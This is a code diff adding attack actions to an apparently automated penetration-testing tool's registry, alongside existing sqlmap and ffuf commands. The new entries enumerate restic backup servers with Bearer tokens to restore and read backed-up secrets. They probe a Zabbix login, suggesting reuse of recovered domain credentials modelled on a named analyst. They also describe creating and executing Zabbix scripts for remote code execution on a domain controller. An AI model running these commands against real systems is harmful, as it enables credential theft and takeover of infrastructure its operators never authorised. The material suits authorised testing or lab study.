@@ -256,6 +256,25 @@ ACTION_REGISTRY: dict[str, Action] = {
     "sqlmap_forms": _a("sqlmap_forms",
         ["sqlmap -u $URL/ --forms --batch --level 2 --risk 2"], risk="propose", runnable=False,
         note="Active SQLi; operator confirms scope."),
+    "restic_rest_enum": _a("restic_rest_enum",
+        ["curl -s $URL/ | jq .",
+         "curl -s -H 'Authorization: Bearer $TOKEN' $URL/<repo>/config -o /dev/null -w '%{http_code}\\n'",
+         "# restic -r rest:$URL/<repo> snapshots  (needs the repo password/token)"],
+        note="GET / lists repos; each needs its own Bearer token (found on the backed-up host). "
+             "Restore the target repo to read backed-up secrets (e.g. the audit runner + key)."),
+    "zabbix_login_probe": _a("zabbix_login_probe",
+        ["curl -s -c /tmp/zbx.txt -d 'name=$USER&password=$PASS&enter=Sign+in' "
+         "$URL/index.php -o /dev/null -w '%{http_code}\\n'"],
+        risk="propose", runnable=False,
+        note="Zabbix front-end login. If auth is LDAP-backed a recovered domain cred may work; "
+             "try michael.torres-style analyst creds."),
+    "zabbix_script_rce": _a("zabbix_script_rce",
+        ["# as admin: Administration > Scripts -> add a script of type 'Script' (server/agent),",
+         "# execute it against a monitored host (DC01/agents01) = command exec there.",
+         "# API: script.create then script.execute {scriptid, hostid}"],
+        risk="propose", runnable=False,
+        note="Zabbix admin can run agentless scripts on any monitored host = RCE on the DC without "
+             "the audit key. The parked key-free path to obj14."),
     "vhost_fuzz": _a("vhost_fuzz",
         ["ffuf -u $URL -H 'Host: FUZZ.$DOMAIN' "
          "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <catchall-size>"],
